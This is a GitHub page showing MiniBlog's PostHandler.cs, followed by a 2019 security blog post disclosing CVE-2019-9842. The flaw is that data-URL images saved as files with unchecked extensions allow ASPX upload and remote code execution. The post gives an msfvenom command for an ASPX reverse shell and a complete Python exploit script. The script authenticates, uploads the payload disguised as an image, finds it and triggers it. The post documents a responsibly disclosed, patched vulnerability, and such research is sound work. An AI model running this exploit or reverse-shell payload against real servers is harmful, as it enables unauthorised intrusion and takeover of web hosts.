=== Content from github.com_0b317690_20250120_231814.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmadskristensen%2FMiniBlog%2Fblob%2F1a7ae45ddba484e2c8f808e288e018748c9ddb57%2FWebsite%2Fapp_code%2Fhandlers%2FPostHandler.cs)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmadskristensen%2FMiniBlog%2Fblob%2F1a7ae45ddba484e2c8f808e288e018748c9ddb57%2FWebsite%2Fapp_code%2Fhandlers%2FPostHandler.cs)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=madskristensen%2FMiniBlog)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[madskristensen](/madskristensen)
/
**[MiniBlog](/madskristensen/MiniBlog)**
Public

* [Notifications](/login?return_to=%2Fmadskristensen%2FMiniBlog) You must be signed in to change notification settings
* [Fork
  376](/login?return_to=%2Fmadskristensen%2FMiniBlog)
* [Star
   923](/login?return_to=%2Fmadskristensen%2FMiniBlog)

* [Code](/madskristensen/MiniBlog)
* [Issues
  42](/madskristensen/MiniBlog/issues)
* [Pull requests
  5](/madskristensen/MiniBlog/pulls)
* [Actions](/madskristensen/MiniBlog/actions)
* [Projects
  0](/madskristensen/MiniBlog/projects)
* [Wiki](/madskristensen/MiniBlog/wiki)
* [Security](/madskristensen/MiniBlog/security)
* [Insights](/madskristensen/MiniBlog/pulse)

Additional navigation options

* [Code](/madskristensen/MiniBlog)
* [Issues](/madskristensen/MiniBlog/issues)
* [Pull requests](/madskristensen/MiniBlog/pulls)
* [Actions](/madskristensen/MiniBlog/actions)
* [Projects](/madskristensen/MiniBlog/projects)
* [Wiki](/madskristensen/MiniBlog/wiki)
* [Security](/madskristensen/MiniBlog/security)
* [Insights](/madskristensen/MiniBlog/pulse)

## Files

 1a7ae45
## Breadcrumbs

1. [MiniBlog](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57)
2. /[Website](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website)
3. /[app\_code](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website/app_code)
4. /[handlers](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website/app_code/handlers)
/
# PostHandler.cs

Copy path Blame  Blame
## Latest commit

## History

[History](/madskristensen/MiniBlog/commits/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website/app_code/handlers/PostHandler.cs)148 lines (120 loc) · 4.67 KB 1a7ae45
## Breadcrumbs

1. [MiniBlog](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57)
2. /[Website](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website)
3. /[app\_code](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website/app_code)
4. /[handlers](/madskristensen/MiniBlog/tree/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website/app_code/handlers)
/
# PostHandler.cs

Top
## File metadata and controls

* Code
* Blame

148 lines (120 loc) · 4.67 KB[Raw](https://github.com/madskristensen/MiniBlog/raw/1a7ae45ddba484e2c8f808e288e018748c9ddb57/Website/app_code/handlers/PostHandler.cs)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148﻿using System;using System.Collections.Generic;using System.Globalization;using System.Linq;using System.Security.Policy;using System.Text;using System.Text.RegularExpressions;using System.Web;
public class PostHandler : IHttpHandler{ public void ProcessRequest(HttpContext context) { Blog.ValidateToken(context);
 if (!context.User.Identity.IsAuthenticated) throw new HttpException(403, "No access");
 string mode = context.Request.QueryString["mode"]; string id = context.Request.Form["id"];
 if (mode == "delete") { DeletePost(id); } else if (mode == "save") { EditPost(id, context.Request.Form["title"], context.Request.Form["excerpt"], context.Request.Form["content"], bool.Parse(context.Request.Form["isPublished"]), context.Request.Form["categories"].Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries)); } }
 private void DeletePost(string id) { Post post = Storage.GetAllPosts().FirstOrDefault(p => p.ID == id);
 if (post == null) throw new HttpException(404, "The post does not exist");
 Storage.Delete(post); }
 private void EditPost(string id, string title, string excerpt, string content, bool isPublished, string[] categories) { Post post = Storage.GetAllPosts().FirstOrDefault(p => p.ID == id);
 if (post != null) { post.Title = title; post.Excerpt = excerpt; post.Content = content; post.Categories = categories; } else { post = new Post() { Title = title, Excerpt = excerpt, Content = content, Slug = CreateSlug(title), Categories = categories }; HttpContext.Current.Response.Write(post.Url); }
 SaveFilesToDisk(post);
 post.IsPublished = isPublished; Storage.Save(post); }
 private void SaveFilesToDisk(Post post) { foreach (Match match in Regex.Matches(post.Content, "(src|href)=\"(data:([^\"]+))\"(>.\*?</a>)?")) { string extension = string.Empty; string filename = string.Empty;
 // Image if (match.Groups[1].Value == "src") { extension = Regex.Match(match.Value, "data:([^/]+)/([a-z]+);base64").Groups[2].Value; } // Other file type else { // Entire filename extension = Regex.Match(match.Value, "data:([^/]+)/([a-z0-9+-.]+);base64.\*\">(.\*)</a>").Groups[3].Value; }
 byte[] bytes = ConvertToBytes(match.Groups[2].Value); string path = Blog.SaveFileToDisk(bytes, extension);
 string value = string.Format("src=\"{0}\" alt=\"\" ", path);
 if (match.Groups[1].Value == "href") value = string.Format("href=\"{0}\"", path);
 Match m = Regex.Match(match.Value, "(src|href)=\"(data:([^\"]+))\""); post.Content = post.Content.Replace(m.Value, value); } }
 private byte[] ConvertToBytes(string base64) { int index = base64.IndexOf("base64,", StringComparison.Ordinal) + 7; return Convert.FromBase64String(base64.Substring(index)); }
 public static string CreateSlug(string title) { title = title.ToLowerInvariant().Replace(" ", "-"); title = RemoveDiacritics(title); title = RemoveReservedUrlCharacters(title);
 if (Storage.GetAllPosts().Any(p => string.Equals(p.Slug, title, StringComparison.OrdinalIgnoreCase))) throw new HttpException(409, "Already in use");
 return title.ToLowerInvariant(); }
 static string RemoveReservedUrlCharacters(string text) { var reservedCharacters = new List<string>() { "!", "#", "$", "&", "'", "(", ")", "\*", ",", "/", ":", ";", "=", "?", "@", "[", "]", "\"", "%", ".", "<", ">", "\\", "^", "\_", "'", "{", "}", "|", "~", "`", "+" };
 foreach (var chr in reservedCharacters) { text = text.Replace(chr, ""); }
 return text; }
 static string RemoveDiacritics(string text) { var normalizedString = text.Normalize(NormalizationForm.FormD); var stringBuilder = new StringBuilder();
 foreach (var c in normalizedString) { var unicodeCategory = CharUnicodeInfo.GetUnicodeCategory(c); if (unicodeCategory != UnicodeCategory.NonSpacingMark) { stringBuilder.Append(c); } }
 return stringBuilder.ToString().Normalize(NormalizationForm.FormC); }
 public bool IsReusable { get { return false; } }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from rastating.github.io_6c570d87_20250120_231814.html ===

[![](/assets/images/avatar.jpg)](/)
# [rastating.github.io](/)

# MiniBlog Remote Code Execution

March 16, 2019

During a review of the MiniBlog project, a Windows based blogging package, I observed an interesting piece of functionality. With most WYSIWYG editors that support images, it’s common to see the images embedded in the markup that is generated, rather than uploaded to the web server. The images are embedded into the markup by using [Data URLs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs) in the `img` elements.

An example of this can be seen in the inspector of the screenshot below:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/editor-img-element.png)

At this point, nothing looked particularly strange. However, upon saving the post and inspecting the same image again, a data URL was no longer being used:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/post-img-element.png)

As can be seen in the above screenshot, instead of an `img` element that reads:

```
<img src="data:image/jpeg;base64,BASE64_CONTENT">

```

There was an element that had a `src` attribute referring to a file on disk:

```
<img src="/posts/files/03d21a01-d1f7-4e09-a6f8-0e67f26eb50b.jpeg" alt="">

```

Examining the code reveals that the post is scanned for data URLs which are subsequently decoded to disk and the corresponding pieces of markup updated to point to the newly created files:

```
private void SaveFilesToDisk(Post post)
{
  foreach (Match match in Regex.Matches(post.Content, "(src|href)=\"(data:([^\"]+))\"(>.*?</a>)?"))
  {
    string extension = string.Empty;
    string filename = string.Empty;

    // Image
    if (match.Groups[1].Value == "src")
    {
      extension = Regex.Match(match.Value, "data:([^/]+)/([a-z]+);base64").Groups[2].Value;
    }
    // Other file type
    else
    {
      // Entire filename
      extension = Regex.Match(match.Value, "data:([^/]+)/([a-z0-9+-.]+);base64.*\">(.*)</a>").Groups[3].Value;
    }

    byte[] bytes = ConvertToBytes(match.Groups[2].Value);
    string path = Blog.SaveFileToDisk(bytes, extension);

    string value = string.Format("src=\"{0}\" alt=\"\" ", path);

    if (match.Groups[1].Value == "href")
        value = string.Format("href=\"{0}\"", path);

    Match m = Regex.Match(match.Value, "(src|href)=\"(data:([^\"]+))\"");
    post.Content = post.Content.Replace(m.Value, value);
  }
}

```

Due to the lack of validation in this method, it is possible to exploit it in order to upload ASPX files and gain remote code execution.

## Crafting a Payload

In the `SaveFilesToDisk` method, there are regular expressions that extract:

* The MIME type
* The base64 content

As MIME types will be in the form of `image/gif` and `image/jpeg`, the software uses the latter half of the MIME type as the file extension to be used. With this in mind, we can manually exploit this by creating a new post, switching the editor to markup mode (last icon in the toolbar) and including an `img` element with a MIME type in the data URL that ends in `aspx`:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/manual-payload.png)

In the above screenshot, I generated the base64 data by creating an ASPX shell using `msfvenom` and encoding with `base64`:

```
$ msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread -f aspx LHOST=192.168.194.141 LPORT=4444 -o shell_no_encoding.aspx
$ base64 -w0 shell_no_encoding.aspx > shell.aspx

```

With netcat listening for incoming connections on port 4444, publishing this post will instantly return a shell once the browser redirects to the new post:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/shell.png)

When examining the post that the browser redirected to after clicking the `Save` button, we can see that the path to the ASPX file is disclosed in the `src` attribute of the `img` element:

![](/assets/images/2019-03-16-miniblog-remote-code-execution/aspx-path.png)

The same vulnerability was also identified within the Miniblog.Core project with the slight difference that the filename to be used can be specified in the `data-filename` attribute of the `img` element as opposed to using the MIME type to determine the file extension.

## Disclosure Timeline

* **2019-03-15**: Vulnerability found, patch created and CVEs requested
* **2019-03-15**: Reach out to vendor to begin disclosure
* **2019-03-16**: CVE-2019-9842 and CVE-2019-9845 assigned to the MiniBlog and MiniBlog.Core vulnerabilities respectively
* **2019-03-16**: Discus with vendor and provide patch
* **2019-03-16**: Patch published to GitHub for both projects

## CVSS v3 Vector

[AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C)

## Proof of Concept Exploit (CVE-2019-9842)

```
import base64
import re
import requests
import os
import sys
import string
import random

if len(sys.argv) < 5:
    print 'Usage: python {file} [base url] [username] [password] [path to payload]'.format(file = sys.argv[0])
    sys.exit(1)

username = sys.argv[2]
password = sys.argv[3]
url = sys.argv[1]
payload_path = sys.argv[4]
extension = os.path.splitext(payload_path)[1][1:]

def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for m in xrange(length))

def request_verification_code(path, cookies = {}):
    r = requests.get(url + path, cookies = cookies)
    m = re.search(r'name="?__RequestVerificationToken"?.+?value="?([a-zA-Z0-9\-_]+)"?', r.text)

    if m is None:
        print '\033[1;31;40m[!]\033[0m Failed to retrieve verification token'
        sys.exit(1)

    token = m.group(1)
    cookie_token = r.cookies.get('__RequestVerificationToken')

    return [token, cookie_token]

payload = None
with open(payload_path, 'rb') as payload_file:
    payload = base64.b64encode(payload_file.read())

# Note: login_token[1] must be sent with every request as a cookie.
login_token = request_verification_code('/views/login.cshtml?ReturnUrl=/')
print '\033[1;32;40m[+]\033[0m Retrieved login token'

login_res = requests.post(url + '/views/login.cshtml?ReturnUrl=/', allow_redirects = False, data = {
    'username': username,
    'password': password,
    '__RequestVerificationToken': login_token[0]
}, cookies = {
    '__RequestVerificationToken': login_token[1]
})

session_cookie = login_res.cookies.get('miniblog')
if session_cookie is None:
    print '\033[1;31;40m[!]\033[0m Failed to authenticate'
    sys.exit(1)

print '\033[1;32;40m[+]\033[0m Authenticated as {user}'.format(user = username)

post_token = request_verification_code('/post/new', {
    '__RequestVerificationToken': login_token[1],
    'miniblog': session_cookie
})

print '\033[1;32;40m[+]\033[0m Retrieved new post token'

post_res = requests.post(url + '/post.ashx?mode=save', data = {
    'id': random_string(16),
    'isPublished': True,
    'title': random_string(8),
    'excerpt': '',
    'content': '<img src="data:image/{ext};base64,{payload}" />'.format(ext = extension, payload = payload),
    'categories': '',
    '__RequestVerificationToken': post_token[0]
}, cookies = {
    '__RequestVerificationToken': login_token[1],
    'miniblog': session_cookie
})

post_url = post_res.text
post_res = requests.get(url + post_url, cookies = {
    '__RequestVerificationToken': login_token[1],
    'miniblog': session_cookie
})
uploaded = True
payload_url = None
m = re.search(r'img src="?(\/posts\/files\/(.+?)\.' + extension + ')"?', post_res.text)

if m is None:
    print '\033[1;31;40m[!]\033[0m Could not find the uploaded payload location'
    uploaded = False

if uploaded:
    payload_url = m.group(1)
    print '\033[1;32;40m[+]\033[0m Uploaded payload to {url}'.format(url = payload_url)

article_id = None
m = re.search(r'article class="?post"? data\-id="?([a-zA-Z0-9\-]+)"?', post_res.text)
if m is None:
    print '\033[1;31;40m[!]\033[0m Could not determine article ID of new post. Automatic clean up is not possible.'
else:
    article_id = m.group(1)

if article_id is not None:
    m = re.search(r'name="?__RequestVerificationToken"?.+?value="?([a-zA-Z0-9\-_]+)"?', post_res.text)
    delete_token = m.group(1)
    delete_res = requests.post(url + '/post.ashx?mode=delete', data = {
        'id': article_id,
        '__RequestVerificationToken': delete_token
    }, cookies = {
        '__RequestVerificationToken': login_token[1],
        'miniblog': session_cookie
    })

    if delete_res.status_code == 200:
        print '\033[1;32;40m[+]\033[0m Deleted temporary post'
    else:
        print '\033[1;31;40m[!]\033[0m Failed to automatically cleanup temporary post'

try:
    if uploaded:
        print '\033[1;32;40m[+]\033[0m Executing payload...'
        requests.get(url + payload_url)
except:
    sys.exit()

```

[#CVE-2019-9842](/tags#CVE-2019-9842)
[#CVE-2019-9845](/tags#CVE-2019-9845)
[#miniblog](/tags#miniblog)
[#offsec](/tags#offsec)
[#asp](/tags#asp)
[#dotnet](/tags#dotnet)

---


